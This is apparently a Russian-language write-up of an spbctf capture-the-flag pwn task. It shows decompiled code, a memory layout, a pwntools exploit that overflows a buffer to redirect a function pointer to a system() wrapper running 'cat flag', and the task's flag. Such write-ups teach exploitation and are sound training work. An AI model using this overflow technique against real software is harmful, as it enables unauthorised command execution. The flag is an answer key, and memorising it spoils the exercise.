[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn2_mc3)
Описание:
Найдите указатель на функцию и перетрите его
`nc 109.233.56.90 11602`
**[fptr2](https://pwn.spbctf.ru/files/canary/fptr2)**

Код:
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  puts("Moar pointers!");
  function_pointer = (void (*)(char *))no_win;
  printf("Before read: %p %p\n", no_win, function_arg);
  read(0, buf, 0x40u);
  printf("After read: %p %p\n", function_pointer, function_arg);
  function_pointer(function_arg);
  return 0;
}
```

Есть вот такая функция:
``` c
void __cdecl my_system(char *arg)
{
  system(arg);
}
```
Её необходимо вызвать.

Надо переполнить буфер, в function_pointer указать ссылку на функцию my_system, в function_arg указать ссылку на память после самой function_arg, а в конце написать команду.
```
.bss:0000000000404090 buf             db 8 dup(?)             ; DATA XREF: main+45↑o
.bss:0000000000404098                 public function_pointer
.bss:0000000000404098 ; void (*function_pointer)(char *)
.bss:0000000000404098 function_pointer dq ?                   ; DATA XREF: main+17↑w
.bss:0000000000404098                                         ; main+25↑r ...
.bss:00000000004040A0                 public function_arg
.bss:00000000004040A0 ; char *function_arg
.bss:00000000004040A0 function_arg     dq ?                   ; DATA XREF: main+1E↑r
.bss:00000000004040A0                                         ; main+56↑r ...
.bss:00000000004040A0 _bss            ends
.bss:00000000004040A0
```

Эксплоит:
``` python
io = start()

buf_addr = 0x404090
payload = b'A' * 8 + p64(0x401162) + p64(buf_addr + 24) + b'cat flag\x00'
io.sendline(payload)

io.interactive()
```

Запуск:
![Pasted image 20260312230435](../../../../z.%20Images/Pasted%20image%2020260312230435.png)

Ответ: `spbctf{9fdf376b920f892d1d312985ae102e89}`